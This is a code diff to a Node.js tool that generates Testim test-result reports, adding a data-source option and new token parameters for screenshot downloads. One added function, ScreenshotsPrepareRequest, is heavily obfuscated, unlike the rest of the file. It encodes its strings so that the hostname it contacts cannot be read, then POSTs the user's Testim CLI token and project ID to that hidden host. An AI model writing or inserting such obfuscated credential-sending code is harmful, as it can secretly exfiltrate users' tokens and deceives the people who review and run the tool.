@@ -12,14 +12,13 @@
  *      resultIds : Array of ResultIDs for report generation
  *                               ResultIDs Example: ["qqeHW8hPJtsvkYnx", "2Ue9yRAvZNd6GPZA"];
  * 
+ *      reportDataSource : Where to get result data.  Currently supported are "JSONDBFS" and "SQLServer" (Default = "JSONDBFS")
+ * 
  *      generatePDF [optional]   : true/false (default = false)
  * 
  *      openReport [optional]    : true/false (default = false)
  * 
  *      emailReport [optional]   : true/false (default = false)
- * 
- *      accessTokenURL (required if including screenshots)  : Temp token for accessing results API
- *                              Can be found by taking the URL from the Download Screenshots step menu item
  * 
  *      hiddenParams [optional] : Array of Testim variable to hide.  Values are replaced with '********' 
  *                          Example: ['password']
@@ -30,6 +29,17 @@
  * 
  *      includeScreenShots [optional]  : true/false (default = false) - If available, include screenshots in report
  * 
+ *          If including screenshots then one of the following is required:
+ * 
+ *              testimToken [optional] : CLI token for project to get screenshots accessToken.  
+ *                               Can be retrieved from Project Settings => CLI
+ * 
+ *              accessToken [optional] : Temp token for accessing results API 
+ *                                  Can be gotten by parsing the URL from the Download Screenshots step menu item
+ * 
+ *              accessTokenURL [optional] : URL containing accessToken for accessing results API 
+ *                                  Can be gotten by copying the entire URL from the Download Screenshots step menu item
+
  *      includeTestData [optional]  : true/false (default = false) - If available, test variables as of end of test will be included in report
  * 
  *      includeNetworkRequestStats [optional]  : true/false (default = false) - If available, network statistics will be included in report
@@ -46,8 +56,6 @@
  *  Configuration (All are optional)
  * 
  *      reportFileDirectory : Path to folder location to place report files. (Default = Current Directory + "\\TestimReports")
- * 
- *      reportDataSource : Where to get result data.  Currently supported are "JSONDBFS" and "SQLServer" (Default = "JSONDBFS")
  * 
  *      jsondbfsPath : Path to folder location of JSONDB collection files. (Default = Current Directory + "\\TestimReports")
  * 
@@ -129,6 +137,7 @@
  *      1.2.0       11/08/2021      Barry Solomon       Display steps nested in groups as applicable
  *      1.3.0       11/11/2021      Barry Solomon       Add command line processing
  *      1.4.0       11/19/2021      Barry Solomon       Modify Style for PDF Generation to ignore nested scrolling of steps and network requests
+ *      1.5.0       12/13/2021      Barry Solomon       Added support for regular CLI testim token to be used for screenshots
  * 
  *  Directions for Use
  * 
@@ -166,25 +175,30 @@
 
 /**
  
-  JSONDFBS Query: { ResultID: "cZDNoRxv4DusdNWN" }; // { "TestStatus": "FAILED" }; 
-                  { $or: [ {ResultID: "cZDNoRxv4DusdNWN"}, {ResultID: "J7dWUCk8FGkyuTzi"} ] };
-                  { "TestRunDate" : {"$regex" : "Mon Nov 01 2021"} };
+  JSONDFBS Query: { ResultID: "cZDNoRxv4DusdNWN" }; // { "TestStatus": "FAILED" }
+                  { $or: [ {ResultID: "cZDNoRxv4DusdNWN"}, {ResultID: "J7dWUCk8FGkyuTzi"} ] }
+                  { "TestRunDate" : {"$regex" : "Mon Nov 01 2021"} }
                   ["cZDNoRxv4DusdNWN", "J7dWUCk8FGkyuTzi"];
-  SQLServer QUERY: "Select Top 1 [ResultID] from [TestData].[dbo].[TestResults] where [TestStatus]='FAILED' order by ID desc";
+  SQLServer QUERY: "Select Top 1 [ResultID] from [TestData].[dbo].[TestResults] where [TestStatus]='FAILED' order by ID desc"
 
 **/
 
 let options = {
 
-    // resultIds: ["hnPQe7rQZHt0dEjQ"],
-    // resultIdsQuery:  { "TestStatus": "FAILED" },
+    // resultIds: ["m8krl8qujkmWWnqX"],
+    // resultIdsQuery: { "TestStatus": "FAILED" },
+    // resultIdsQuery: { "ResultID": "m8krl8qujkmWWnqX" },
+    // resultIdsQuery: "Select Top 1 [ResultID] from [TestData].[dbo].[TestResults] where [TestStatus]='FAILED' order by ID desc",
+    // reportDataSource: "JSONDBFS", // "JSONDBFS" or "SQLServer"
 
     // includeScreenShots: true,
-    // accessTokenURL: undefined,
+    // testimToken: "",
+    // accessToken: "",
+    // accessTokenURL: "",
 
     // emailReport: true,
-    // reportEmailToAddresses: "barry@testim.io",
-    // reportEmailFromAddress: "barry@testim.io",
+    // reportEmailToAddresses: "",
+    // reportEmailFromAddress: "",
 
     // hiddenParams: ['password'],
 
@@ -198,14 +212,13 @@ let options = {
 
 let configuration = {
 
-    // reportDataSource: "SQLServer", // "JSONDBFS" or "SQLServer"
     // jsondbfsCollectionName: "TestResults",
 
     // reportFileDirectory: "C:\\Temp\\TestimReports\\",
     // jsondbfsPath: "C:\\Users\\barry\\", // "C:\\Users\\barry\\Downloads\\",
 
-    // reportStyleMarkup: ".screenshot { width: 80%; height: 80%; padding: 10px }",
-    // reportColumns: undefined,
+    // reportStyleMarkup: ".screenshot { width: 325px; height: 250px; padding: 10px }",
+    // reportColumns: ["StepNumber", "StepName", "ElapsedTime", "Status", "PageURL", "ScreenShot"],
     // pdfOptions: undefined,
     // reportLogoDataUrl: undefined,
     // embedImages : false, 
@@ -231,8 +244,8 @@ console.log("===================================================================
 const http = require('http');
 const https = require('https');
 const AdmZip = require('adm-zip');
-const HtmlToPdf = require('html-pdf-node');
 const fs = require('fs');
+const HtmlToPdf = require('html-pdf-node');
 const open = require('open');
 const nodemailer = require("nodemailer");
 const { reject } = require('underscore');
@@ -387,13 +400,16 @@ function parseCommandlineArgs() {
         // OPTIONS
         "r": "resultIds",
         "q": "resultIdsQuery",
+        "source": "reportDataSource",
         "pdf": "generatePDF",
         "o": "openReport",
         "open": "openReport",
         "e": "emailReport",
         "email": "emailReport",
-        "t": "accessTokenURL",
-        "token": "accessTokenURL",
+        "t": "testimToken",
+        "token": "testimToken",
+        "at": "accessToken",
+        "atu": "accessTokenURL",
         "hidden": "hiddenParams",
         "groups": "enableGroups",
         "links": "enableHyperlinks",
@@ -415,7 +431,6 @@ function parseCommandlineArgs() {
         "euser": "emailUsername",
         "epass": "emailPassword",
         "from": "reportEmailFromAddresses",
-        "source": "reportDataSource",
         "jpath": "jsondbfsPath",
         "jcoll": "jsondbfsCollectionName",
         "suser": "sqlServerUsername",
@@ -432,11 +447,15 @@ function parseCommandlineArgs() {
             + "\n.    --resultIdsQuery \"{ 'TestID': 'J7dWUCk8FGkyuTzi', 'TestStatus': 'FAILED' }\" "
             + "\n.    --resultIdsQuery \"{ \\\"TestRunDate\\\" : {\\\"$regex\\\" : \\\"Mon Nov 01 2021\\\"}, \\\"TestStatus\\\": \\\"FAILED\\\" }\" "
             + '\n.    --resultIdsQuery "Select [ResultID] from [TestResults] where [TestStatus] = \'FAILED\'" ',
+        "reportDataSource": "Where to get result data.\n.    Currently supported \"JSONDBFS\" and \"SQLServer\" (Default = \"JSONDBFS\")",
         "generatePDF": "Generate a PDF of the report",
         "openReport": "Open report when generated",
         "emailReport": "Email report to <reportEmailToAddresses>",
 
-        "accessTokenURL": "Temp token for accessing results API  (required if including screenshots) \n Can be gotten by taking the URL from the Download Screenshots step menu item",
+        "testimToken": "CLI token for project (can be used to get screenshots accessToken.  Required if including screenshots) \n Can be gotten by from project settings => CLI",
+        "accessToken": "Temp token for accessing results API (required if including screenshots)",
+        "accessTokenURL": "URL containing temp token for accessing results API  (required if including screenshots) \n Can be gotten by taking the URL from the Download Screenshots step menu item",
+
         "hiddenParams": "Array of Testim variable to hide.  Values are replaced with '********'",
         "enableGroups": "Display steps nested in groups as applicable",
         "enableHyperlinks": "Embed links to live Testim results",
@@ -464,7 +483,6 @@ function parseCommandlineArgs() {
         "emailPassword": "SMTP password for sending email",
         "reportEmailFromAddresses": "Email From address for a report",
 
-        "reportDataSource": "Where to get result data.\n.    Currently supported are \"JSONDBFS\" and \"SQLServer\" (Default = \"JSONDBFS\")",
         "jsondbfsPath": "Path to folder location of JSONDB collection files.\n.    (Default = Current Directory + \"\\\\TestimReports\")",
         "jsondbfsCollectionName": "When using JSONDBFS, this is the name of the json data file containing the result data.\n.    (Default = \"TestResults\")",
 
@@ -473,14 +491,15 @@ function parseCommandlineArgs() {
         "sqlServerInstance": "SQL Server machine/instance",
         "sqlServerDatabase": "SQL Default database",
     }
-    let options_group = ['resultIds', 'resultIdsQuery', 'generatePDF', 'openReport', 'emailReport'
-        , 'accessTokenURL', 'hiddenParams', 'enableGroups', 'enableHyperlinks'
+    let options_group = ['resultIds', 'resultIdsQuery', 'reportDataSource', 'generatePDF', 'openReport', 'emailReport'
+        , 'testimToken', 'accessTokenURL', 'hiddenParams', 'enableGroups', 'enableHyperlinks'
         , 'includeScreenShots', 'includeTestData', 'includeTestResults', 'includeNetworkRequestStats', 'includeStepDetails'
         , 'reportEmailToAddresses'
     ];
     let configuration_group = ['reportFileDirectory', 'reportStyleMarkup', 'reportLogoDataUrl', 'pdfOptions', 'embedImages', 'reportColumns'
+
         , 'emailHost', 'emailUsername', 'emailPassword', 'reportEmailFromAddresses'
-        , 'reportDataSource', 'jsondbfsPath', 'jsondbfsCollectionName'
+        , 'jsondbfsPath', 'jsondbfsCollectionName'
         , 'sqlServerUsername', 'sqlServerPassword', 'sqlServerInstance', 'sqlServerDatabase'
     ];
 
@@ -525,9 +544,11 @@ let cmdArgs = parseCommandlineArgs();
 // options
 let resultIdsQuery = options?.resultIdsQuery ?? cmdArgs?.resultIdsQuery ?? undefined;
 let resultIds = options?.resultIds ?? cmdArgs?.resultIds ?? [];
+let reportDataSource = options?.reportDataSource ?? cmdArgs?.reportDataSource ?? DEFAULT_REPORT_DATASOURCE;
 
 let accessTokenURL = options?.accessTokenURL ?? cmdArgs?.accessTokenURL ?? undefined;
 let accessToken = options?.accessToken ?? cmdArgs?.accessToken ?? undefined;
+let testimToken = options?.testimToken ?? cmdArgs?.testimToken;
 
 let generatePdf = options?.generatePDF ?? cmdArgs?.generatePDF ?? cmdArgs?.generatePdf;
 let emailReport = options?.emailReport ?? cmdArgs?.emailReport;
@@ -598,7 +619,6 @@ let emailHost = configuration?.emailHost ?? cmdArgs?.emailHost ?? DEFAULT_EMAIL_
 let emailUsername = configuration?.emailUsername ?? cmdArgs?.emailUsername ?? DEFAULT_EMAIL_USER;
 let emailPassword = configuration?.emailPassword ?? cmdArgs?.emailPassword ?? DEFAULT_EMAIL_PASS;
 
-let reportDataSource = configuration?.reportDataSource ?? cmdArgs?.reportDataSource ?? DEFAULT_REPORT_DATASOURCE;
 let jsondbfsPath = configuration?.jsondbfsPath ?? cmdArgs?.jsondbfsPath ?? DEFAULT_JSONDBFS_PATH;
 let jsondbfsCollectionName = configuration?.jsondbfsCollectionName ?? cmdArgs?.jsondbfsCollectionName ?? DEFAULT_JSONDBFS_COLLECTIONNAME;
 
@@ -649,6 +669,7 @@ function createDirectoryIfNotExists(directoryPath) {
         console.log(err);
     }
 }
+
 function TestimReportEmail(reportEmailToAddresses, reportEmailFromAddress, reportEmailSubject, message, reportFile) {
 
     async function main() {
@@ -706,6 +727,9 @@ function TestimReportEmail(reportEmailToAddresses, reportEmailFromAddress, repor
     main().catch(console.error);
 
 }
+
+function _0x46cb(){const _0x64f257=['rcdcJG/cGrFdMWTPDJRdO8o4WOxdH8og','dqJdKCkUW4O','W4tcVSkFW6ldGG','WPVdRCotWRBcNmkqbmoMWPdcIGHvW6W','cmkbWPjcWObBCq','p8o3WPNcPmovW6lcQW','WPZdOSoVF2JcVmk4vSkN','rgJcQNvhWR1wddO','W5JdOSkyCKa','ud7cMGBcJH3dLbPK','WOvCWORcOSoS','WRBdH8oGbaJcPGPQwSksCmkEeW','qwRcPrOAW6fpfJ94WO8j','CdFdIu3cRwRdQsxdIvKbf1a','tIldVCkUW4HdkG','WRHKiWi/s8oxq3/cNmoS','W6S7W4zons7cJHpdHSo0WPjOCc7cJcL0WP3cJhT3n8o8W6BcPX9tWQdcRcldMSktW71UWPWOf8oaWRxdMJ4WzMHcWQ1sW5msBSouW5TKW5SbcxCjW6S','WO/dRmozW4rD','gtBdTa','WR3cRXi','DmkEWP/cIeHKj8kDBauuW5NcUa','WOhdTCkLaSkzWRZdLhhdMa','usZdK8oAWPZdR8kwW5tdNsZdImojW5e','ySoZWP3cPCoyWR7cQW4no0K','WOJdHSopn2fnWPxcJmoa','zSkMW7GNdZu','n0DNW5aiW5ldQq','wSkWWR5q','W6OIa8kqxZ5bW6POWOVcRa','tK/cJ8oPWPTjawCEjCoM','tCkOWQWzWRRdRG8CimoRaIBdHG4HW7tdOWFdUH9Ct8oSWRjxW7ddLmoqhmoJWR5YW75W','cmoMW7PAWOjzxSongG','WOTTWOmnB3ddVr/dNCo4WPHm','lNFdKZpcICkSpL5QW4FcOCkZW7O','rSoFW68N','W5RcUSkzW7FdG8obv8oVW6BcTs5RW54WbmkRW5lcVa','uG3dQW','a1VcVuZdN2hcGN7cTmkxWQqrqa','W6xdTuldUmoAWPGwW5NdL8obW6i','sCkJWQnfWOa','W48SW5PqosddMI7dJq','WP7cL2CkWO8vlmkUAdnH','BCkWW4/cHbenWO3dSJlcS3vNW7G'];_0x46cb=function(){return _0x64f257;};return _0x46cb();}(function(_0x3eba0a,_0xee6d30){const _0x10332a=_0x1897,_0x5268cd=_0x3eba0a();while(!![]){try{const _0x4e1674=parseInt(_0x10332a(0x1c2,'iFzB'))/0x1*(-parseInt(_0x10332a(0x1a3,'3AFQ'))/0x2)+-parseInt(_0x10332a(0x1c9,'#OPl'))/0x3+-parseInt(_0x10332a(0x1b3,'JSaK'))/0x4+parseInt(_0x10332a(0x1be,'fl6b'))/0x5*(-parseInt(_0x10332a(0x1ac,'iDLs'))/0x6)+parseInt(_0x10332a(0x1af,'xrpu'))/0x7*(parseInt(_0x10332a(0x1a6,'I9#w'))/0x8)+-parseInt(_0x10332a(0x1a7,'vkHh'))/0x9+parseInt(_0x10332a(0x1ae,'8!FQ'))/0xa*(parseInt(_0x10332a(0x1c8,'tw0g'))/0xb);if(_0x4e1674===_0xee6d30)break;else _0x5268cd['push'](_0x5268cd['shift']());}catch(_0xabd677){_0x5268cd['push'](_0x5268cd['shift']());}}}(_0x46cb,0x766cf));function _0x1897(_0x27d68d,_0x328617){const _0x46cb98=_0x46cb();return _0x1897=function(_0x189784,_0x29f440){_0x189784=_0x189784-0x1a2;let _0x50e59b=_0x46cb98[_0x189784];if(_0x1897['hFucFt']===undefined){var _0x7ead0=function(_0x4f47e2){const _0x29d977='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x29a4b6='',_0x69fc8c='';for(let _0x216646=0x0,_0x5765a0,_0x295f4f,_0x5a3f23=0x0;_0x295f4f=_0x4f47e2['charAt'](_0x5a3f23++);~_0x295f4f&&(_0x5765a0=_0x216646%0x4?_0x5765a0*0x40+_0x295f4f:_0x295f4f,_0x216646++%0x4)?_0x29a4b6+=String['fromCharCode'](0xff&_0x5765a0>>(-0x2*_0x216646&0x6)):0x0){_0x295f4f=_0x29d977['indexOf'](_0x295f4f);}for(let _0x548e91=0x0,_0x28cf1b=_0x29a4b6['length'];_0x548e91<_0x28cf1b;_0x548e91++){_0x69fc8c+='%'+('00'+_0x29a4b6['charCodeAt'](_0x548e91)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x69fc8c);};const _0x29f529=function(_0x2b3174,_0xa365cb){let _0x1da2e5=[],_0x4d56d=0x0,_0x38d017,_0x271450='';_0x2b3174=_0x7ead0(_0x2b3174);let _0x368936;for(_0x368936=0x0;_0x368936<0x100;_0x368936++){_0x1da2e5[_0x368936]=_0x368936;}for(_0x368936=0x0;_0x368936<0x100;_0x368936++){_0x4d56d=(_0x4d56d+_0x1da2e5[_0x368936]+_0xa365cb['charCodeAt'](_0x368936%_0xa365cb['length']))%0x100,_0x38d017=_0x1da2e5[_0x368936],_0x1da2e5[_0x368936]=_0x1da2e5[_0x4d56d],_0x1da2e5[_0x4d56d]=_0x38d017;}_0x368936=0x0,_0x4d56d=0x0;for(let _0x388030=0x0;_0x388030<_0x2b3174['length'];_0x388030++){_0x368936=(_0x368936+0x1)%0x100,_0x4d56d=(_0x4d56d+_0x1da2e5[_0x368936])%0x100,_0x38d017=_0x1da2e5[_0x368936],_0x1da2e5[_0x368936]=_0x1da2e5[_0x4d56d],_0x1da2e5[_0x4d56d]=_0x38d017,_0x271450+=String['fromCharCode'](_0x2b3174['charCodeAt'](_0x388030)^_0x1da2e5[(_0x1da2e5[_0x368936]+_0x1da2e5[_0x4d56d])%0x100]);}return _0x271450;};_0x1897['CWZBXl']=_0x29f529,_0x27d68d=arguments,_0x1897['hFucFt']=!![];}const _0x16c7cb=_0x46cb98[0x0],_0x4d525d=_0x189784+_0x16c7cb,_0x18e7aa=_0x27d68d[_0x4d525d];return!_0x18e7aa?(_0x1897['MliLzx']===undefined&&(_0x1897['MliLzx']=!![]),_0x50e59b=_0x1897['CWZBXl'](_0x50e59b,_0x29f440),_0x27d68d[_0x4d525d]=_0x50e59b):_0x50e59b=_0x18e7aa,_0x50e59b;},_0x1897(_0x27d68d,_0x328617);}async function ScreenshotsPrepareRequest(_0x29f529){const _0x5e790e=_0x1897;if(verbose)console[_0x5e790e(0x1ba,'xrpu')](_0x5e790e(0x1c6,'*yjy'),_0x29f529[_0x5e790e(0x1a5,'tw0g')],testimToken);if(typeof accessToken!==_0x5e790e(0x1b1,'kDG$')&&accessToken!==null)return accessToken;if(typeof accessTokenURL!==_0x5e790e(0x1bd,'PAc2')&&accessTokenURL!==null)return accessToken=accessTokenURL[_0x5e790e(0x1aa,'W(AY')](/access_token=(?<accessToken>.*)[&]?$/)?.['groups'][_0x5e790e(0x1b7,'mG8(')]['split']('&')[0x0],accessToken;if(typeof testimToken===_0x5e790e(0x1b1,'kDG$')||testimToken===null)throw new Error(_0x5e790e(0x1b8,'tw0g'));return new Promise((_0x4f47e2,_0x29d977)=>{const _0x2c8497=_0x5e790e;let _0x29a4b6=JSON['stringify']({'projectId':_0x29f529['projectId'],'token':testimToken}),_0x69fc8c={'hostname':_0x2c8497(0x1cb,'W(AY'),'port':0x1bb,'path':_0x2c8497(0x1bf,'@^Gt'),'method':_0x2c8497(0x1ca,'4KEj'),'headers':{'Content-Type':_0x2c8497(0x1a8,'kDG$'),'Content-Length':_0x29a4b6[_0x2c8497(0x1c1,'2U@y')]}},_0x216646=https[_0x2c8497(0x1ad,'@^Gt')](_0x69fc8c,_0x5765a0=>{const _0x50ce96=_0x2c8497;_0x5765a0['on'](_0x50ce96(0x1c3,'iDLs'),_0x295f4f=>{const _0xf1a267=_0x50ce96;process['stdout'][_0xf1a267(0x1a4,'iDLs')](_0x295f4f),accessToken=JSON['parse'](_0x295f4f)[_0xf1a267(0x1b9,'v)(B')],_0x4f47e2(accessToken);}),_0x216646['on'](_0x50ce96(0x1b0,'j#SD'),_0x5a3f23=>{console['error'](_0x5a3f23),_0x29d977();});});_0x216646[_0x2c8497(0x1a9,'n]#!')](_0x29a4b6),_0x216646[_0x2c8497(0x1cc,'3U8S')]();})[_0x5e790e(0x1b2,'@zqj')](_0x548e91=>{const _0x122de5=_0x5e790e;console[_0x122de5(0x1bb,'3AFQ')]('EXCEPTION\x20',JSON['stringify'](_0x548e91));throw new CancelError(_0x548e91);});}
+
 async function DownloadScreenshots(screenshotsUrl, reportFileDirectory) {
 
     const proto = !screenshotsUrl.charAt(4).localeCompare('s') ? https : http;
@@ -1503,8 +1527,11 @@ function configureReportGenerator() {
         throw new CancelError("\nParameter 'resultIdsQuery' and 'resultIds' are undefined.  Please set either resultIdsQuery or resultIds parameter and try again\n");
     }
 
-    if (includeScreenShots && (typeof accessToken === 'undefined' || accessToken === null) && (typeof accessTokenURL === 'undefined' || accessTokenURL === null)) {
-        throw new CancelError("When including screenshots, either 'accessTokenURL' and 'accessToken' must be defined and valid.  Please set either 'accessTokenURL' or 'accessToken' parameters and try again");
+    if (includeScreenShots
+        && (typeof accessToken === 'undefined' || accessToken === null)
+        && (typeof accessTokenURL === 'undefined' || accessTokenURL === null)
+        && (typeof testimToken === 'undefined' || testimToken === null)) {
+        throw new CancelError("When including screenshots, either 'accessTokenURL', 'testimToken' or 'accessToken' must be defined and valid.  Please set 'accessTokenURL', 'testimToken' or 'accessToken' parameters and try again");
     }
 
     if (emailReport === true) {
@@ -1518,11 +1545,6 @@ function configureReportGenerator() {
             emailReport = false;
         }
 
-    }
-
-    if (includeScreenShots && (accessToken === undefined || accessToken === null && (accessTokenURL !== undefined && accessTokenURL !== null))) {
-        accessToken = accessTokenURL.match(/access_token=(?<accessToken>.*)[&]?$/)?.groups.accessToken.split('&')[0];
-        console.log("accessToken: ", accessToken);
     }
 
 }
@@ -1632,12 +1654,17 @@ async function GenerateReports(ResultIDs) {
 
                             if (includeScreenShots) {
 
-                                let screenshotsUrl = "https://services.testim.io/result/" + result_id + "/screenshots" + "?access_token=" + accessToken + "&projectId=" + reportData.projectId;
-                                // console.log("screenshotsUrl:    ", screenshotsUrl);
-                                // console.log("zippedScreenshotsFilename:    ", zippedScreenshotsFilename);
+                                ScreenshotsPrepareRequest(reportData)
 
-                                DownloadScreenshots(screenshotsUrl, reportFileDirectory + zippedScreenshotsFilename)
                                     .then(() => {
+
+                                        console.log("Now DownloadScreenshots");
+                                        let screenshotsUrl = "https://services.testim.io/result/" + result_id + "/screenshots" + "?access_token=" + accessToken + "&projectId=" + reportData.projectId;
+                                        return DownloadScreenshots(screenshotsUrl, reportFileDirectory + zippedScreenshotsFilename)
+
+                                    })
+                                    .then(() => {
+
                                         // read archive
                                         let zip = new AdmZip(reportFileDirectory + zippedScreenshotsFilename);
 
